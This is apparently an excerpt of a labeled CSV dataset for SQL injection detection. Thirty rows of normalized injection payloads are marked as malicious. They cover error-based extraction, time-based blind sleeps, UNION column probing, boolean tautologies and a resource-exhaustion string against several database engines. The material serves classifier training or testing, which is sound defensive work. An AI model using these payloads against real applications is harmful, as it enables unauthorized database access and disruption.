row_index,payload_norm,label,sqli_type_hint
9060,"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""jcgh"" = ""jcgh",1,
9061,"1"" ) ) as yiaw where 2841 = 2841 or sleep ( 5 ) --",1,
9062,-5585' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1,
9063,1' ) ) ) rlike sleep ( 5 ) and ( ( ( 'svuu' = 'svuu,1,
9064,"1'+ ( select 'xqpe' where 4020 = 4020 union all select null,null--",1,
9065,"-4849"" ) ) or ( 5005 = 9111 ) *9111 and ( ( ""catv"" like ""catv",1,
9066,"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'mbxh' like 'mbxh",1,
9067,"1"" where 8732 = 8732",1,
9068,-2411%' ) ) ) or 6872 = 6872 and ( ( ( '%' = ',1,
9069,1' ) and 4822 = 6997 and ( 'ojku' = 'ojku,1,
9070,-7950' ) or 9323 = 9323#,1,
9071,"1"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""oyuj"" = ""oyuj",1,
9072,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'opyt' = 'opyt",1,
9073,select pg_sleep ( 5 ) and ( ( '%' = ',1,
9074,"1 where 2363 = 2363 union all select null,null,null,null,null--",1,
9075,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'rdpv' = 'rdpv",1,
9076,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'eqyr' like 'eqyr",1,
9077,"1%"" ) union all select null,null,null,null,null,null#",1,
9078,1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'ymnm' = 'ymnm,1,
9079,1' ) ) and ( 3020 = 3020 ) *6703 and ( ( 'mgfd' = 'mgfd,1,
9080,"-3300' union all select 8979,8979,8979,8979,8979,8979--",1,
9081,"1%' union all select null,null,null,null,null,null,null,null,null,null#",1,
9082,"1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'fdoc' like 'fdoc",1,
9083,1' ) ) ) and 4069 = 8786 and ( ( ( 'eftr' = 'eftr,1,
9084,"1"" ) ) as rhea where 2982 = 2982 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",1,
9085,select ( case when ( 5418 = 6516 ) then 1 else 5418* ( select 5418 from master..sysdatabases ) end ) --,1,
9086,-7037' ) ) as epsg where 3684 = 3684 union all select 3684--,1,
9087,select pg_sleep ( 5 ),1,
9088,1' ) where 7903 = 7903,1,
9089,"1%' procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
